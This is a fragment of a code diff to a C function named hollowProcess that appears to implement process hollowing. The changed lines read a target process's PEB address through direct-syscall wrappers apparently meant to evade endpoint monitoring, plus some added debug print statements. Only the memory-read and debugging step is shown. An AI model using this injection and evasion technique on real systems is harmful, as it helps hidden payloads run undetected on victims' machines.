@@ -166,6 +166,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
     BYTE procAddr[64];
+    BYTE procAddr2[64];
+
     BYTE dataBuff[0x200];
     SIZE_T bytesRW = 0;
     // THis 64 is based on the architecture used...
@@ -177,13 +179,28 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     printf("Starting NoahRead\n");
     //getchar();
 
-    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    BOOL result = NoahRead2(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    printf("Enging NoahRead\n");
-    printf("RESULTSS????? %d", result);
 
-    printf("Proc Address: 0x%p", procAddr);
+    //working - BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+
+    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
+    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
+
+   // BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    
+   
+   // printf("RESULTSS????? %d, %d\n", result, bytesRW);
+    
+    BOOL result = NoahRead2(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    
+    printf("Enging NoahRead\n");
+    
+    //printf("RESULTSS????? %d, %d\n", result, bytesRW);
+    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
+    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
+    printf("&Proc Address (Working): 0x%p\n", *procAddr);
+    printf("&Proc Address (Noah): 0x%p\n", *procAddr2);
+
     getchar();
     uintptr_t executableAddress = *((uintptr_t*)procAddr);//
     
